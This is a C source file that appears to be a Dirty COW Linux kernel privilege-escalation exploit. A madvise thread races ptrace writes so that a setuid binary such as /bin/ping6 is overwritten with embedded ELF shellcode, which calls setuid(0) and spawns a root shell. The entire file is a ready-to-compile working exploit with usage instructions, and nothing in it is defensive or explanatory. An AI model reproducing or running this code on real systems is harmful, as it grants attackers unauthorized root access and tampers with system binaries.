/*
	$ gcc -pthread derpyc0w.c -o derpyc0w
	greetz to blacksun nerds

	we've determined that there may, indeed, be a cow level
*/
#define MADV_DONTNEED 0x4
#include <fcntl.h>
#include <pthread.h>
#include <string.h>
#include <stdio.h>
#include <stdint.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <stdbool.h>
#include <stdlib.h>
#include <sys/ptrace.h>
#include <unistd.h>

void *map;
pthread_t pth;
struct stat st;

#if __x86_64
/*
	cowshell-x86_64.asm
*/
const char cashm0ney[] = {
	0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x3e, 0x00, 0x01, 0x00, 0x00, 0x00,
	0xa1, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x38, 0x00, 0x01, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x06, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x06, 0x01, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x2f, 0x70, 0x72, 0x6f, 0x63, 0x2f, 0x73, 0x79, 0x73, 0x2f, 0x76, 0x6d,
	0x2f, 0x64, 0x69, 0x72, 0x74, 0x79, 0x5f, 0x77, 0x72, 0x69, 0x74, 0x65,
	0x62, 0x61, 0x63, 0x6b, 0x5f, 0x63, 0x65, 0x6e, 0x74, 0x69, 0x73, 0x65,
	0x63, 0x73, 0x00, 0x30, 0x00, 0x48, 0x31, 0xff, 0xb8, 0x69, 0x00, 0x00,
	0x00, 0x0f, 0x05, 0xb8, 0x02, 0x00, 0x00, 0x00, 0x48, 0xbf, 0x78, 0x00,
	0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0xbe, 0x01, 0x00, 0x00, 0x00, 0x0f,
	0x05, 0x48, 0x89, 0xc3, 0xb8, 0x01, 0x00, 0x00, 0x00, 0x48, 0x89, 0xdf,
	0x48, 0xbe, 0x9f, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0xba, 0x01,
	0x00, 0x00, 0x00, 0x0f, 0x05, 0xb8, 0x03, 0x00, 0x00, 0x00, 0x48, 0x89,
	0xdf, 0x0f, 0x05, 0x48, 0x31, 0xff, 0x57, 0x57, 0x5e, 0x5a, 0x48, 0xbf,
	0x2f, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x48, 0xc1, 0xef, 0x08,
	0x57, 0x54, 0x5f, 0xb8, 0x3b, 0x00, 0x00, 0x00, 0x0f, 0x05};
#elif __i386
/* 
	cowshell_x86.asm
*/
const char cashm0ney[] = {
	0x7f, 0x45, 0x4c, 0x46, 0x01, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x03, 0x00, 0x01, 0x00, 0x00, 0x00,
	0x85, 0x80, 0x04, 0x08, 0x34, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x34, 0x00, 0x20, 0x00, 0x01, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x80, 0x04, 0x08, 0x00, 0x80, 0x04, 0x08, 0xcf, 0x00, 0x00, 0x00,
	0xcf, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00,
	0x2f, 0x70, 0x72, 0x6f, 0x63, 0x2f, 0x73, 0x79, 0x73, 0x2f, 0x76, 0x6d,
	0x2f, 0x64, 0x69, 0x72, 0x74, 0x79, 0x5f, 0x77, 0x72, 0x69, 0x74, 0x65,
	0x62, 0x61, 0x63, 0x6b, 0x5f, 0x63, 0x65, 0x6e, 0x74, 0x69, 0x73, 0x65,
	0x63, 0x73, 0x00, 0x30, 0x00, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68,
	0x00, 0x31, 0xdb, 0xb8, 0xd5, 0x00, 0x00, 0x00, 0xcd, 0x80, 0xb8, 0x05,
	0x00, 0x00, 0x00, 0xbb, 0x54, 0x80, 0x04, 0x08, 0xb9, 0x01, 0x00, 0x00,
	0x00, 0xcd, 0x80, 0x89, 0xc3, 0xb8, 0x04, 0x00, 0x00, 0x00, 0xb9, 0x7b,
	0x80, 0x04, 0x08, 0xba, 0x01, 0x00, 0x00, 0x00, 0xcd, 0x80, 0xb8, 0x06,
	0x00, 0x00, 0x00, 0xcd, 0x80, 0xb8, 0x0b, 0x00, 0x00, 0x00, 0xbb, 0x7d,
	0x80, 0x04, 0x08, 0xb9, 0x00, 0x00, 0x00, 0x00, 0xba, 0x00, 0x00, 0x00,
	0x00, 0xcd, 0x80};
#endif

void *madviseThread(void *arg)
{
	printf("[*] Starting madvise thread.\n");
	while (true)
	{
		madvise(map, sizeof(cashm0ney), MADV_DONTNEED);
	}
}

int main(int argc, char *argv[])
{
	if (argc < 3)
	{
		printf("[?] Usage: %s /path/to/readable/suid/binary /path/to/binary/backup\n", argv[0]);
		printf("\tExample: %s /bin/ping6 /tmp/ping6.bak\n", argv[0]);
		return -1;
	}

	int f = open(argv[1], O_RDONLY);
	if (f == -1)
	{
		printf("[-] Couldn't open %s.\n", argv[1]);
		return -1;
	}
	if (fstat(f, &st))
	{
		printf("[-] Couldn't stat %s\n", argv[1]);
		return -1;
	}
	printf("[*] Opened %s\n", argv[1]);
	char *freshBuffer = (char *)malloc(st.st_size * sizeof(char) + 1);
	if (read(f, freshBuffer, st.st_size) == -1)
	{
		printf("[-] Couldn't copy %s into backup buffer.\n", argv[1]);
		return -1;
	}
	int backupHandle = open(argv[2], O_RDWR | O_CREAT);
	if (backupHandle == -1)
	{
		printf("[-] Couldn't open %s for writing zzzzzz\n", argv[2]);
		return -1;
	}
	printf("[*] Backing up %s to %s\n", argv[1], argv[2]);
	if (write(backupHandle, freshBuffer, st.st_size) == -1)
	{
		printf("[-] Couldn't write a backup of %s to %s\n", argv[1], argv[2]);
		return -1;
	}
	if (close(backupHandle) == -1)
	{
		printf("[-] Couldn't close backup file.\n"); // Try to proceed yolo
	}
	map = mmap(NULL, st.st_size + sizeof(long), PROT_READ, MAP_PRIVATE, f, 0);
	printf("[*] File mapped at 0x%p\n", map);
	pid_t pid = fork();
	if (pid)
	{
		// In the parent
		printf("[*] Waiting for child to alert\n");
		waitpid(pid, NULL, 0);
		printf("[*] Alerted by child.\n");
		int writeLength = sizeof(cashm0ney);
		printf("[*] Preparing to write %d bytes\n", writeLength);
		int ptraceStatus = 0;
		void *oldmap = map;
		printf("[*] Trying to perform writes.\n");
		for (int offset = 0; offset < writeLength; offset++)
		{
			bool retry = true;
			do
			{
				ptraceStatus = ptrace(PTRACE_POKETEXT, pid, map + offset, *((long *)(cashm0ney + offset)));
				if (memcmp(map + offset, cashm0ney + offset, 1) == 0)
				{
					printf("[*] Wrote byte to %d\n", offset);
					retry = false;
				}
			} while (retry);
		}
		printf("[+] w00t, writes finished\n");
		kill(pid, SIGKILL);
		munmap(map, sizeof(cashm0ney + sizeof(long)));
		printf("[+] Popping shell. Remember to restore %s from %s with correct perms!\n", argv[1], argv[2]);
		execve(argv[1], NULL, NULL);
	}
	else
	{
		// In the child
		pthread_create(&pth, NULL, madviseThread, NULL);
		ptrace(PTRACE_TRACEME); // Alert
		kill(getpid(), SIGSTOP);
		pthread_join(pth, NULL);
	}
	return 0;
}